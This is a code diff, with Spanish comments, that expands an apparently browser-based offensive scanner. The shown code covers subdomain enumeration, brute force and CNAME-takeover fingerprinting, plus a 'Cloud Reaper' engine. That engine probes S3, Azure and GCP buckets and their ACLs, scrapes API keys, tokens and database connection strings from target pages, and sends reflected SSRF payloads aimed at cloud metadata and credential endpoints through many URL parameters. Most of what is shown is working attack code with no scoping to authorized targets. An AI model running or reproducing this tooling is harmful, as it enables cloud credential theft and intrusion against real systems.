+  { p: /(^|\.)herokussl\.com$/i,                  c: 'Heroku SSL',        b: [/No such app/i] },
+  { p: /(^|\.)gitbook\.io$/i,                    c: 'GitBook',            b: [/Page not found/i] },
+  { p: /(^|\.)wishpond\.com$/i,                   c: 'Wishpond',           b: [/This Wishpond account doesn'?t exist/i] },
+  { p: /(^|\.)short\.io$/i,                        c: 'Short.io',           b: [/link does not exist/i] },
+  { p: /(^|\.)tave\.com$/i,                        c: 'Tave',               b: [/Be Back Soon/i] },
+  { p: /(^|\.)myjetbrains\.com$/i,                c: 'JetBrains YouTrack', b: [/The requested project does not exist/i] }
 ];
 
 /* ── [UTILS DE RED] ─────────────────────────────────────────────── */
@@ -23318,7 +23344,7 @@ async function krStart() {
    7 fuentes reales corriendo con Promise.allSettled(): que UNA falle o de timeout
    NUNCA bloquea la lectura de las otras 6 (cada fuente resuelve independiente). */
   krLine('', null);
-  krLine('═══ FASE 1: RECOLECCION PASIVA (OSINT — 12 fuentes XTREME) ═══', 'section');
+  krLine('═══ FASE 1: RECOLECCION PASIVA (OSINT — 16 fuentes XTREME X4) ═══', 'section');
   let srcOk = 0;
   let crtshFailed = false;
 
@@ -23382,6 +23408,22 @@ async function krStart() {
       } else if (src.id === 'sublist3r') {
         /* Sublist3r: array JSON plano ["a.x.com","b.x.com",...] — filtrar por target */
         try { (JSON.parse(res.body) || []).forEach(h => { if (typeof h === 'string' && h.toLowerCase().endsWith(target)) found.push(h.toLowerCase()); }); } catch(e) {}
+      } else if (src.id === 'omnisint') {
+        /* Rapid7 Sonar: array JSON plano de subdominios (cuando responde, es de lo mas completo) */
+        const data = JSON.parse(res.body);
+        if (Array.isArray(data)) data.forEach(h => { if (typeof h === 'string') found.push(h); });
+      } else if (src.id === 'otxurls') {
+        /* OTX URL List: 2º endpoint de AlienVault — URLs historicas asociadas al dominio → hostnames */
+        const data = JSON.parse(res.body);
+        if (Array.isArray(data.url_list)) data.url_list.forEach(u => { try { found.push(new URL(u.url).hostname); } catch (e) {} });
+      } else if (src.id === 'ddgsearch') {
+        /* DuckDuckGo: los buscadores indexan hosts que NINGUNA fuente pasiva vio nunca */
+        const reDg = new RegExp('([a-z0-9-]+\\.)+' + target + '(?![a-z0-9-])', 'gi');
+        (res.body.match(reDg) || []).forEach(h => found.push(h.toLowerCase()));
+      } else if (src.id === 'bingsearch') {
+        /* Bing: idem — caza lo que el rastreador de Microsoft descubrio del target */
+        const reBg = new RegExp('([a-z0-9-]+\\.)+' + target + '(?![a-z0-9-])', 'gi');
+        (res.body.match(reBg) || []).forEach(h => found.push(h.toLowerCase()));
       } else if (src.id === 'bufferover') {
         /* Formatos historicos de bufferover: {FDNS_A:['ip,host',...]} o {Results:['ip,host',...]}.
            Se prueban ambos sin asumir uno solo — si ninguno calza, simplemente no aporta nada. */
@@ -23424,7 +23466,7 @@ async function krStart() {
     krLine('', null);
     krLine('═══ FASE 2: FUERZA BRUTA ACTIVA (' + WORDLIST.length + ' palabras) ═══', 'section');
     let bruteNew = 0, done = 0;
-    await krPool(WORDLIST, 40, async (word) => {
+    await krPool(WORDLIST, 48, async (word) => {
       const candidate = word + '.' + target;
       const res = await dohResolve(candidate, 'A');
       done++;
@@ -23482,19 +23524,19 @@ async function krStart() {
   /* FASE 2.7 (v3.5): BRUTE DE SEGUNDO NIVEL — los subdominios anidados
      (dev.api.target.com) casi JAMAS aparecen en fuentes pasivas ni en
      wordlists de 1 nivel: se derivan de los hosts YA confirmados. */
-  const krL2Words = ['dev','api','admin','test','stage','staging','internal','portal','vpn','mail','intranet','panel','dashboard','grafana','jenkins','git','auth','sso','app','backup','db','monitor','logs','status','proxy'];
+  const krL2Words = ['dev','api','admin','test','stage','staging','internal','portal','vpn','mail','intranet','panel','dashboard','grafana','jenkins','git','auth','sso','app','backup','db','monitor','logs','status','proxy','kibana','sonar','nexus','harbor','argocd','vault','elastic','elk','redis','mongo','mysql','pgsql','kafka','rabbitmq','mq','etl','bi','reports','jira','confluence','wiki','docs','help','support','helpdesk','servicedesk','noc','dc','lab','labs','qa','uat','stg','pre','core','cache','search','worker','cron','queue','ws','wss','smtp','imap','pop','mx','ns','dns','fw','bastion','access','remote','rdp','ssh','mgmt','ilo','idrac','ipmi','pdu','edge','node5','old3','new2','temp2','demo3','sandbox2','training2','mirror2','replica2','shard3','archive3','upload2','share2','public2','private2','client2','clients2','operator','webmaster','superadmin','sysadmin','service2','micro','lambda2','fn2','jobs2','workers2','celery','sidekiq','resque','bull','session2','token2','jwt2','cert2','pki2'];
   const krL1Hosts = Array.from(krResults.keys()).filter(h => {
     const pre = h.slice(0, h.length - (target.length + 1));
     return h.endsWith('.' + target) && pre && pre.indexOf('.') === -1 && pre.length < 16;
-  }).slice(0, 12);
+  }).slice(0, 16);
   const krL2Set = new Set();
   krL1Hosts.forEach(h => krL2Words.forEach(w => krL2Set.add(w + '.' + h)));
-  const krL2List = Array.from(krL2Set).filter(c => !krResults.has(c)).slice(0, 300);
+  const krL2List = Array.from(krL2Set).filter(c => !krResults.has(c)).slice(0, 400);
   if (krL2List.length) {
     krLine('', null);
     krLine('═══ FASE 2.7: BRUTE 2º NIVEL (' + krL2List.length + ' candidatos sobre ' + krL1Hosts.length + ' hosts base) ═══', 'section');
     let l2New = 0, l2Done = 0;
-    await krPool(krL2List, 20, async (cand) => {
+    await krPool(krL2List, 32, async (cand) => {
       const res = await dohResolve(cand, 'A');
       l2Done++;
       if (l2Done % 40 === 0) krProgress(50 + (l2Done / krL2List.length) * 4);
@@ -23510,6 +23552,39 @@ async function krStart() {
     });
     krLine('Brute de 2º nivel completo: ' + l2New + ' subdominios anidados nuevos', l2New > 0 ? 'ok' : 'dim');
   }
+  /* FASE 2.8 (v4): PERMUTACIONES DOBLE TOKEN — hosts hibridos del tipo
+     dev-api, staging-auth, api-v2: no estan en NINGUNA wordlist de 1 token,
+     no los lista OSINT pasivo y el brute de 2 nivel no los alcanza (ese solo
+     prueba prefijo + host ya confirmado). Doble generacion: con guion y fusion. */
+  const krP8Pre = ['dev','test','stage','staging','qa','uat','int','demo','admin','api','app','web','internal','pre','beta','prod','sandbox','lab','mobile','www3'];
+  const krP8Suf = ['api','v2','v3','v4','app','web','admin','portal','auth','sso','db','proxy','mail','cdn','media','static','files','login','gw','svc'];
+  const krP8Set = new Set();
+  krP8Pre.forEach(a => krP8Suf.forEach(b => {
+    if (a === b) return;
+    krP8Set.add(a + '-' + b + '.' + target);
+    krP8Set.add(a + b + '.' + target);
+  }));
+  const krP8List = Array.from(krP8Set).filter(c => !krResults.has(c)).slice(0, 400);
+  if (krP8List.length) {
+    krLine('', null);
+    krLine('═══ FASE 2.8: PERMUTACIONES DOBLE TOKEN (' + krP8List.length + ' candidatos) ═══', 'section');
+    let p8New = 0, p8Done = 0;
+    await krPool(krP8List, 32, async (cand) => {
+      const res = await dohResolve(cand, 'A');
+      p8Done++;
+      if (p8Done % 60 === 0) krProgress(50 + (p8Done / krP8List.length) * 5);
+      if (res && res.Answer && res.Answer.length) {
+        const ips = res.Answer.filter(a => a.type === 1).map(a => a.data).sort().join(',');
+        if (ips && ips !== wildcardIPs && !krResults.has(cand)) {
+          krResults.set(cand, { source: 'perm', ip: ips.replace(/,/g, ', '), alive: true });
+          p8New++;
+          krLine('[P8] ' + cand + ' → ' + ips.replace(/,/g, ', '), 'ok');
+          krUpdateStats();
+        }
+      }
+    });
+    krLine('Permutaciones completas: ' + p8New + ' hosts hibridos nuevos', p8New > 0 ? 'ok' : 'dim');
+  }
   krProgress(55);
 
   let hostList = Array.from(krResults.keys());
@@ -23522,7 +23597,7 @@ async function krStart() {
     krLine('', null);
     krLine('═══ FASE 3: RESOLUCION DNS (DoH round-robin G+CF) ═══', 'section');
     let alive = 0, done2 = 0;
-    await krPool(hostList, 40, async (host) => {
+    await krPool(hostList, 48, async (host) => {
       const entry = krResults.get(host);
       if (entry.alive === undefined) {
         const res = await dohResolve(host, 'A');
@@ -23549,7 +23624,7 @@ async function krStart() {
     krLine('═══ FASE 4: PROBING HTTP (via proxy Worker) ═══', 'section');
     const targets = hostList.filter(h => krResults.get(h).alive !== false);
     let httpOk = 0, done3 = 0;
-    await krPool(targets, 30, async (host) => {
+    await krPool(targets, 36, async (host) => {
       let res = await krProxyFetch('https://' + host + '/', { timeout: 8000 });
       if(!res || typeof res.status !== 'number' || res.status <= 0){ res = await krProxyFetch('http://' + host + '/', { timeout: 8000 }); }
       const entry = krResults.get(host);
@@ -23566,6 +23641,41 @@ async function krStart() {
     krLine('HTTP probing completo: ' + httpOk + ' con respuesta 2XX/3XX de ' + targets.length + ' probados', 'ok');
     krUpdateStats();
   }
+  /* FASE 4.5 (v4): CONTENT MINING — los hosts vivos guardaron hasta 4KB de
+     HTML en FASE 4: ahi viven los links a admin., login., api. y demas hosts
+     internos que NINGUNA fuente pasiva lista. Se cosechan, se resuelven por
+     DNS y se agregan a resultados (JS y HTML source mining, tecnica real). */
+  var krCmRe = /(?:[a-z0-9][a-z0-9-]*\.)+[a-z]{2,}/gi;
+  const krCmSet = new Set();
+  Array.from(krResults.entries()).forEach(par => {
+    const ebody = par[1] && par[1].httpBody;
+    if (!ebody) return;
+    (ebody.match(krCmRe) || []).forEach(h => {
+      h = h.toLowerCase();
+      if ((h === target || h.endsWith('.' + target)) && !krResults.has(h) && !krCmSet.has(h)) krCmSet.add(h);
+    });
+  });
+  const krCmList = Array.from(krCmSet).slice(0, 200);
+  if (krCmList.length) {
+    krLine('', null);
+    krLine('═══ FASE 4.5: CONTENT MINING (' + krCmList.length + ' hosts mencionados en el HTML de hosts vivos) ═══', 'section');
+    let cmNew = 0, cmDone = 0;
+    await krPool(krCmList, 32, async (cand) => {
+      const res = await dohResolve(cand, 'A');
+      cmDone++;
+      if (cmDone % 30 === 0) krProgress(90);
+      if (res && res.Answer && res.Answer.length) {
+        const ips = res.Answer.filter(a => a.type === 1).map(a => a.data).sort().join(',');
+        if (ips && ips !== wildcardIPs && !krResults.has(cand)) {
+          krResults.set(cand, { source: 'mining', ip: ips.replace(/,/g, ', '), alive: true });
+          cmNew++;
+          krLine('[CM] ' + cand + ' → ' + ips.replace(/,/g, ', '), 'ok');
+          krUpdateStats();
+        }
+      }
+    });
+    krLine('Content mining completo: ' + cmNew + ' subdominios extraidos del contenido de hosts vivos', cmNew > 0 ? 'ok' : 'dim');
+  }
   krProgress(90);
 
   /* Fase 5: CNAME takeover — solo marca like si el CNAME apunta a un servicio
@@ -23575,7 +23685,7 @@ async function krStart() {
     krLine('', null);
     krLine('═══ FASE 5: CNAME TAKEOVER DETECTION ═══', 'section');
     let takeoverCount = 0;
-    await krPool(hostList, 30, async (host) => {
+    await krPool(hostList, 36, async (host) => {
       const entry = krResults.get(host);
       const cnameRes = await dohResolve(host, 'CNAME');
       if (!cnameRes || !cnameRes.Answer || !cnameRes.Answer.length) return;
@@ -25566,10 +25676,12 @@ document.getElementById("runAttack").onclick = async ()=>{
 </script>
 <script>
 /* ═════════════════════════════════════════════════════════════════
-   NIMBUS — CLOUD REAPER ENGINE v2.0 ULTRA (prefijo nb-, scope aislado)
-   9 oleadas: recon multi-provider → S3 (regiones+ACL) → Azure →
-   GCP/Firebase → Shopify → Metadata SSRF (reflejado) →
-   K8s/Docker/Registry → CNAME takeover via DoH → Takeover+reporte.
+   NIMBUS — CLOUD REAPER ENGINE v3.0 REAPER XTREME (prefijo nb-, scope aislado)
+   11 oleadas: recon multi-provider (30) + cosecha de llaves → S3 (regiones+ACL+perms) → Azure →
+   GCP/Firebase → Shopify → Metadata SSRF (39 endpoints + 30 params reflejados) →
+   K8s/Docker/Registry → CNAME takeover via DoH (38 servicios) →
+   MULTI-CLOUD ENUM (DO/OCI/Alibaba/Wasabi/Linode/Scaleway/IBM) →
+   CLOUD CREDS LEAK HUNT (.env/serviceAccount/tfstate/dumps) → Takeover+reporte.
    Todo HTTP real via el Worker proxy. Cero simulación.
    ═════════════════════════════════════════════════════════════════ */
 (function(){
@@ -25626,7 +25738,7 @@ function nbPool(items, conc, fn){
   return Promise.all(ws);
 }
 
-/* ── fingerprints cloud: 16 providers ── */
+/* ── fingerprints cloud: 30 providers (REAPER) ── */
 var NB_CLOUD_RES = [
   [/([a-z0-9.-]+\.s3[.-][a-z0-9-]*amazonaws\.com)/gi, 'AWS S3'],
   [/([a-z0-9-]+\.s3-website[a-z0-9.-]*\.amazonaws\.com)/gi, 'AWS S3 web'],
@@ -25645,7 +25757,19 @@ var NB_CLOUD_RES = [
   [/([a-z0-9.-]+\.aliyuncs\.com)/gi, 'Alibaba OSS'],
   [/([a-z0-9-]+\.myshopify\.com)/gi, 'Shopify'],
   [/([a-z0-9-]+\.azurewebsites\.net)/gi, 'Azure App'],
-  [/([a-z0-9-]+\.appspot\.com)/gi, 'GCP AppEngine']
+  [/([a-z0-9-]+\.appspot\.com)/gi, 'GCP AppEngine'],
+  [/([a-z0-9-]+\.r2\.dev)/gi, 'Cloudflare R2'],
+  [/([a-z0-9-]+\.r2\.cloudflarestorage\.com)/gi, 'CF R2 S3'],
+  [/([a-z0-9-]+\.supabase\.co)/gi, 'Supabase'],
+  [/([a-z0-9-]+\.netlify\.app|cdn\.netlify\.com)/gi, 'Netlify'],
+  [/([a-z0-9-]+\.vercel\.app|vercel-storage\.com)/gi, 'Vercel'],
+  [/([a-z0-9-]+\.pages\.dev)/gi, 'CF Pages'],
+  [/([a-z0-9-]+\.onrender\.com)/gi, 'Render'],
+  [/([a-z0-9-]+\.fly\.dev)/gi, 'Fly.io'],
+  [/([a-z0-9.-]+\.s3[.-][a-z0-9-]*\.scw\.cloud)/gi, 'Scaleway'],
+  [/([a-z0-9.-]+\.s3[.-][a-z0-9-]*\.cloud-object-storage\.appdomain\.cloud)/gi, 'IBM COS'],
+  [/([a-z0-9.-]+\.cos\.[a-z0-9.-]+\.myqcloud\.com)/gi, 'Tencent COS'],
+  [/([a-z0-9-]+\.trafficmanager\.net)/gi, 'Azure TM']
 ];
 function nbExtractCloud(body){
   var out = [];
@@ -25668,9 +25792,41 @@ function nbHit(cat, detail){
   nbLog('[💥 HIT] ' + cat + ' — ' + detail, 'hit');
 }
 
+/* ── cosecha de llaves cloud en HTML/JS (REAPER: keys en el cuerpo del target) ── */
+function nbHarvestKeys(body){
+  var out = [], seen = {};
+  var pats = [
+    [/AIza[0-9A-Za-z_\-]{35}/g, 'Google API key'],
+    [/AKIA[0-9A-Z]{16}/g, 'AWS AccessKeyId'],
+    [/ASIA[0-9A-Z]{16}/g, 'AWS STS AccessKeyId'],
+    [/ya29\.[0-9A-Za-z_\-]{20,}/g, 'Google OAuth token'],
+    [/eyJhbGciOi[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g, 'JWT hardcoded'],
+    [/(?:sk|pk)_live_[0-9a-zA-Z]{20,}/g, 'Stripe live key'],
+    [/ghp_[A-Za-z0-9]{36}/g, 'GitHub token'],
+    [/glpat-[A-Za-z0-9_\-]{20,}/g, 'GitLab token'],
+    [/xox[bpars]-[A-Za-z0-9\-]{10,}/g, 'Slack token'],
+    [/-----BEGIN (RSA|EC|OPENSSH|PGP|DSA) PRIVATE KEY-----/g, 'Private key embebida'],
+    [/("type"\s*:\s*"service_account")/g, 'service account JSON'],
+    [/firebase[^{}]{0,60}?apiKey\s*['"]?\s*[:=]\s*['"][A-Za-z0-9_\-]{30,}/gi, 'Firebase apiKey config'],
+    [/postgresql(?:s)?:\/\/[^\s'"]*:[^\s'"]*@/gi, 'postgres connection string'],
+    [/mysql:\/\/[^\s'"]*:[^\s'"]*@/gi, 'mysql connection string'],
+    [/mongodb(?:\+srv)?:\/\/[^\s'"]*:[^\s'"]*@/gi, 'mongodb connection string'],
+    [/redis:\/\/[^\s'"]*@/gi, 'redis URL'],
+    [/(?:ghp_)?[A-Za-z0-9+\/_-]{30,}:[A-Za-z0-9_\-]{30,}@github\.com/g, 'credencial git embebida']
+  ];
+  pats.forEach(function(pt){
+    var m; var re = new RegExp(pt[0].source, 'gi');
+    while((m = re.exec(body || '')) !== null){
+      var k = pt[1] + ': ' + String(m[0]).slice(0, 70);
+      if(!seen[k]){ seen[k] = 1; out.push(k); }
+    }
+  });
+  return out;
+}
+
 /* ═══ OLEADA 1: CLOUD RECON multi-provider ═══ */
 function nbWaveRecon(origin){
-  nbLog('═══ OLEADA 1/9: CLOUD RECON — fingerprint de superficie cloud (16 providers) ═══', 'section');
+  nbLog('═══ OLEADA 1/11: CLOUD RECON — fingerprint de superficie cloud (30 providers) + cosecha de llaves ═══', 'section');
   nbTotal += 1;
   return nbP(origin + '/').then(function(res){
     nbDone++; nbProg();
@@ -25686,6 +25842,8 @@ function nbWaveRecon(origin){
     var body = res.body || '';
     var assets = nbExtractCloud(body);
     nbCloudAssets = nbCloudAssets.concat(assets);
+    var keyz = nbHarvestKeys(body);
+    keyz.forEach(function(k){ nbHit('CLOUD KEY/CREDS EXPUESTA', k); });
     nbRow('1', 'Recon', origin + '/', res.status || 0, fps.length + ' headers cloud · ' + assets.length + ' assets cloud');
     fps.slice(0,12).forEach(function(f){ nbLog('  [hdr] ' + f, 'ok'); });
     assets.forEach(function(a){ nbLog('  [asset] ' + a, 'warn'); });
@@ -25714,7 +25872,7 @@ function nbBucketCandidates(dom){
 /* ═══ OLEADA 2: S3 ENUM + regiones + ACL ═══ */
 var NB_S3_REGIONS = ['us-east-1','us-west-2','eu-west-1','sa-east-1','eu-central-1','ap-southeast-2','us-east-2','us-west-1','ca-central-1','eu-west-2','eu-west-3','eu-north-1','ap-south-1','ap-northeast-1','ap-southeast-1','me-south-1','af-south-1','ap-northeast-2'];
 function nbWaveS3(dom){
-  nbLog('═══ OLEADA 2/9: AWS S3 ENUM — buckets + regiones + ACL + website endpoints ═══', 'section');
+  nbLog('═══ OLEADA 2/11: AWS S3 ENUM — buckets + regiones + ACL + website endpoints ═══', 'section');
   var cands = nbBucketCandidates(dom);
   var extra = nbCloudAssets.filter(function(a){ return /s3[.-]|amazonaws/i.test(a); });
   extra.forEach(function(a){
@@ -25754,20 +25912,23 @@ function nbWaveS3(dom){
     });
   }).then(function(){
     /* fase 2b: para buckets CONFIRMADOS, probe ACL + regiones + website endpoint */
-    var deep = Array.from(new Set(s3Found)).slice(0, 20);
-    nbTotal += deep.length * 8;
+    var deep = Array.from(new Set(s3Found)).slice(0, 30);
+    nbTotal += deep.length * 16;
     return nbPool(deep, 8, function(b){
       var jobs = [
         nbP('https://' + b + '.s3.amazonaws.com/?acl'),
         nbP('https://' + b + '.s3.amazonaws.com/?policy'),
         nbP('https://' + b + '.s3.amazonaws.com/?list-type=2&max-keys=5')
       ];
+      ['cors','tagging','versioning','encryption','location','logging','website','lifecycle'].forEach(function(pp){
+        jobs.push(nbP('https://' + b + '.s3.amazonaws.com/?' + pp));
+      });
       NB_S3_REGIONS.forEach(function(r){
         jobs.push(nbP('https://' + b + '.s3-' + r + '.amazonaws.com/'));
         jobs.push(nbP('https://' + b + '.s3-website-' + r + '.amazonaws.com/'));
       });
       return Promise.all(jobs).then(function(rs){
-        nbDone += 8; nbProg();
+        nbDone += 16; nbProg();
         var aclRes = rs[0], polRes = rs[1];
         if(aclRes && /<AccessControlPolicy>|PUBLIC|AllUsers|AuthenticatedUsers/i.test((aclRes.body||'').slice(0,1500))){
           nbHit('S3 ACL EXPOSED', b + '?acl responde con policy — enumeración de permisos');
@@ -25789,6 +25950,30 @@ function nbWaveS3(dom){
             nbRow('2', 'S3-Region', b + ' @ ' + r, 403, 'regional existe');
           }
         });
+        var perms = rs.slice(3 + NB_S3_REGIONS.length * 2);
+        if(perms[0] && perms[0].status === 200 && /<CORSConfiguration>|<CORSRule>/i.test((perms[0].body||''))){
+          nbHit('S3 CORS ABIERTO', b + '?cors — cualquier origen puede leer el bucket');
+          nbRow('2', 'S3-Perms', b + '?cors', 200, 'CRIT — CORS abierto');
+        }
+        if(perms[1] && perms[1].status === 200 && /<Tagging>/i.test((perms[1].body||''))){
+          nbRow('2', 'S3-Perms', b + '?tagging', 200, 'tags legibles (env/infra leak)');
+        }
+        if(perms[3] && perms[3].status === 200 && /<EncryptionConfiguration/i.test((perms[3].body||''))){
+          nbRow('2', 'S3-Perms', b + '?encryption', 200, 'config de cifrado legible');
+        }
+        if(perms[4] && perms[4].status === 200 && /<LocationConstraint/i.test((perms[4].body||''))){
+          nbRow('2', 'S3-Perms', b + '?location', 200, 'región legible');
+        }
+        if(perms[5] && perms[5].status === 200 && /<LoggingEnabled/i.test((perms[5].body||''))){
+          nbHit('S3 LOGGING LEGIBLE', b + '?logging — destino de access logs expuesto');
+          nbRow('2', 'S3-Perms', b + '?logging', 200, 'VULN — logging legible');
+        }
+        if(perms[6] && perms[6].status === 200 && /<WebsiteConfiguration/i.test((perms[6].body||''))){
+          nbRow('2', 'S3-Perms', b + '?website', 200, 'website config legible');
+        }
+        if(perms[7] && perms[7].status === 200 && /<LifecycleConfiguration/i.test((perms[7].body||''))){
+          nbRow('2', 'S3-Perms', b + '?lifecycle', 200, 'lifecycle legible');
+        }
       });
     });
   }).then(function(){
@@ -25798,7 +25983,7 @@ function nbWaveS3(dom){
 
 /* ═══ OLEADA 3: AZURE (blob/queue/table + apps) ═══ */
 function nbWaveAzure(dom){
-  nbLog('═══ OLEADA 3/9: AZURE ENUM — blob/queue/table + App Services ═══', 'section');
+  nbLog('═══ OLEADA 3/11: AZURE ENUM — blob/queue/table + App Services ═══', 'section');
   var cands = nbBucketCandidates(dom).slice(0, 70);
   nbTotal += cands.length;
   return nbPool(cands, 12, function(c){
@@ -25836,7 +26021,7 @@ function nbWaveAzure(dom){
 
 /* ═══ OLEADA 4: GCP / FIREBASE ═══ */
 function nbWaveGCP(dom){
-  nbLog('═══ OLEADA 4/9: GCP + FIREBASE — storage, RTDB, hosting, AppEngine ═══', 'section');
+  nbLog('═══ OLEADA 4/11: GCP + FIREBASE — storage, RTDB, hosting, AppEngine ═══', 'section');
   var cands = nbBucketCandidates(dom).slice(0, 70);
   var jobs = [];
   cands.forEach(function(b){
@@ -25883,7 +26068,7 @@ function nbWaveGCP(dom){
 
 /* ═══ OLEADA 5: SHOPIFY ═══ */
 function nbWaveShopify(origin){
-  nbLog('═══ OLEADA 5/9: SHOPIFY — attack surface de e-commerce ═══', 'section');
+  nbLog('═══ OLEADA 5/11: SHOPIFY — attack surface de e-commerce ═══', 'section');
   var paths = [
     ['/products.json?limit=250&page=1', 'products.json p1'],
     ['/products.json?limit=250&page=2', 'products.json p2'],
@@ -25930,7 +26115,7 @@ function nbWaveShopify(origin){
 
 /* ═══ OLEADA 6: METADATA SSRF (directo + reflejado) ═══ */
 function nbWaveMetadata(origin){
-  nbLog('═══ OLEADA 6/9: METADATA SSRF — IMDS AWS/GCP/Azure/Alibaba/DO/OCI/Hetzner/Tencent/Packet/K8s (31 endpoints) + reflejado via target ═══', 'section');
+  nbLog('═══ OLEADA 6/11: METADATA SSRF — IMDS AWS/GCP/Azure/Alibaba/DO/OCI/Hetzner/Tencent/Packet/K8s (39 endpoints) + 30 params reflejados via target ═══', 'section');
   var MET_PAT = {
     cred:/AccessKeyId|SecretAccessKey|Token"/i, ami:/ami-id|instance-id|reservation-id/i,
     gcp:/project|instance|machineType/i, gtoken:/ya29\.|access_token/i,
@@ -25939,7 +26124,8 @@ function nbWaveMetadata(origin){
     do:/droplet_agent|droplet|region/i, oci:/instance|opc|compartment/i,
     hetz:/hetzner|server_number|public_ipv4/i, tencent:/tencent|instance-id/i,
     k8s:/kubelet|pods|containers|secrets/i, packet:/packet|equinix|facility/i,
-    msi:/managed|clientId|objectId|access_token/i, sshk:/ssh-rsa|ssh-ed25519|BEGIN OPENSSH/i
+    msi:/managed|clientId|objectId|access_token/i, sshk:/ssh-rsa|ssh-ed25519|BEGIN OPENSSH/i,
+    ostk:/uuid|public_key|instance_id/i, dkr:/ApiVersion|Platform|Components/i, etcd:/etcdserver|etcd/i
   };
   var direct = [
     ['AWS IMDSv1', 'http://169.254.169.254/latest/meta-data/', MET_PAT.ami],
@@ -25972,16 +26158,25 @@ function nbWaveMetadata(origin){
     ['Tencent meta', 'http://metadata.tencentyun.com/latest/meta-data/', MET_PAT.tencent],
     ['Packet meta', 'https://metadata.packet.net/metadata', MET_PAT.packet],
     ['Kubelet pods', 'http://127.0.0.1:10250/pods', MET_PAT.k8s],
-    ['ECS v2 creds', 'http://169.254.170.2/v2/credentials', MET_PAT.cred]
+    ['ECS v2 creds', 'http://169.254.170.2/v2/credentials', MET_PAT.cred],
+    ['AWS IMDS versionado', 'http://169.254.169.254/2018-09-24/meta-data/', MET_PAT.ami],
+    ['GCP metadata beta', 'http://metadata.google.internal/computeMetadata/v1beta1/instance/', MET_PAT.gcp],
+    ['GCP external-ip', 'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip', MET_PAT.identity],
+    ['OpenStack meta', 'http://169.254.169.254/openstack/latest/meta_data.json', MET_PAT.ostk],
+    ['Azure wireserver', 'http://168.63.129.16/machine/?comp=extend', MET_PAT.azure],
+    ['Docker swarm', 'http://127.0.0.1:2375/version', MET_PAT.dkr],
+    ['etcd server', 'http://127.0.0.1:2379/version', MET_PAT.etcd],
+    ['Kubelet read-only', 'http://127.0.0.1:10255/pods', MET_PAT.k8s]
   ];
   /* reflejado: le pedimos al TARGET que cargue la IP interna (SSRF clásico) */
-  var SSRF_PARAMS = ['?url=', '?image=', '?path=', '?load=', '?page=', '?src=', '?redirect=', '?next=', '?file=', '?link=', '?out=', '?view=', '?goto=', '?domain=', '?site=', '?img=', '?feed=', '?proxy=', '?callback=', '?reference='];
+  var SSRF_PARAMS = ['?url=', '?image=', '?path=', '?load=', '?page=', '?src=', '?redirect=', '?next=', '?file=', '?link=', '?out=', '?view=', '?goto=', '?domain=', '?site=', '?img=', '?feed=', '?proxy=', '?callback=', '?reference=', '?uri=', '?dest=', '?destination=', '?document=', '?data=', '?remote=', '?return=', '?continue=', '?load_url=', '?reference_url='];
   var jobs = [];
   direct.forEach(function(d){ jobs.push({ kind:'direct', p:d }); });
   SSRF_PARAMS.forEach(function(sp){ jobs.push({ kind:'refl', sp:sp, p:direct[0] }); });
   /* XTREME: también reflejamos IAM creds (30 params) + Azure IMDS (10 params) */
   SSRF_PARAMS.forEach(function(sp){ jobs.push({ kind:'refl', sp:sp, p:direct[1] }); });
   SSRF_PARAMS.slice(0, 10).forEach(function(sp){ jobs.push({ kind:'refl', sp:sp, p:direct[6] }); });
+  SSRF_PARAMS.slice(10, 20).forEach(function(sp){ jobs.push({ kind:'refl', sp:sp, p:direct[4] }); });
   nbTotal += jobs.length;
   return nbPool(jobs, 6, function(j){
     var url = j.kind === 'direct' ? j.p[1] : origin + '/' + j.sp + encodeURIComponent(j.p[1]);
@@ -26002,7 +26197,7 @@ function nbWaveMetadata(origin){
 
 /* ═══ OLEADA 7: K8S / DOCKER / REGISTRY ═══ */
 function nbWaveK8s(origin){
-  nbLog('═══ OLEADA 7/9: K8S / DOCKER / REGISTRY — control plane + daemon ═══', 'section');
+  nbLog('═══ OLEADA 7/11: K8S / DOCKER / REGISTRY — control plane + daemon ═══', 'section');
   var paths = [
     '/api/v1/nodes', '/api/v1/pods', '/api/v1/secrets', '/api/v1/configmaps',
     '/api/v1/namespaces', '/api/v1/serviceaccounts', '/api/v1/persistentvolumes',
@@ -26069,11 +26264,24 @@ var NB_TK_SVC = [
   [/\.firebaseapp\.com$/i, /site not found|404/i],
   [/\.web\.app$/i, /site not found|404/i],
   [/\.run\.app$/i, /error|not found/i],
-  [/\.cloudfunctions\.net$/i, /error|not found/i]
+  [/\.cloudfunctions\.net$/i, /error|not found/i],
+  [/\.gitbook\.io$/i, /page not found|404/i],
+  [/\.helpjuice\.com$/i, /we could not find that page|404/i],
+  [/\.zendesk\.com$/i, /help center closed|page not found|domain not found/i],
+  [/\.tilda\.cc$/i, /please renew your subscription|please renew/i],
+  [/\.webflow\.io$/i, /page you are looking for wasn'?t found/i],
+  [/\.cargo\.collective\.net$/i, /404 not found|if you'?re the owner/i],
+  [/\.strikingly\.com$/i, /page not found|domain is available/i],
+  [/\.tictail\.com$/i, /has been deactivated|shop has been/i],
+  [/\.wpengine\.com$/i, /the site you were looking for|doesn'?t exist/i],
+  [/\.myjetbrains\.com$/i, /is not a registered incloud|not a registered/i],
+  [/\.squarespace\.com$/i, /domain mapping error|website expired/i],
+  [/\.fastly\.net$/i, /fastly error|not found/i],
+  [/\.herokudns\.com$/i, /no such app|404/i]
 ];
 function nbWaveCname(dom){
-  nbLog('═══ OLEADA 8/9: CLOUD CNAME TAKEOVER — DoH + fingerprints de 25 servicios ═══', 'section');
-  var words = ['www','cdn','static','assets','img','images','media','files','storage','backup','old','api','app','dev','staging','test','shop','portal','vault','docs','download','s3','aws','cloud','beta','demo','img2','media2','cdn2','assets2'];
+  nbLog('═══ OLEADA 8/11: CLOUD CNAME TAKEOVER — DoH + fingerprints de 38 servicios ═══', 'section');
+  var words = ['www','cdn','static','assets','img','images','media','files','storage','backup','old','api','app','dev','staging','test','shop','portal','vault','docs','download','s3','aws','cloud','beta','demo','img2','media2','cdn2','assets2','www2','origin','new','static2','cdn3','img3','web2','app2','api2','shop2','files2','backup2','staging2','dev2','assets-old'];
   var jobs = [];
   words.forEach(function(w){ jobs.push(w + '.' + dom); });
   nbTotal += jobs.length * 2; /* DoH + fetch del hit */
@@ -26107,9 +26315,110 @@ function nbWaveCname(dom){
   });
 }
 
-/* ═══ OLEADA 9: TAKEOVER + REPORTE ═══ */
+/* ═══ OLEADA 9: MULTI-CLOUD ENUM — 7 providers extra (REAPER) ═══ */
+function nbWaveMultiCloud(dom){
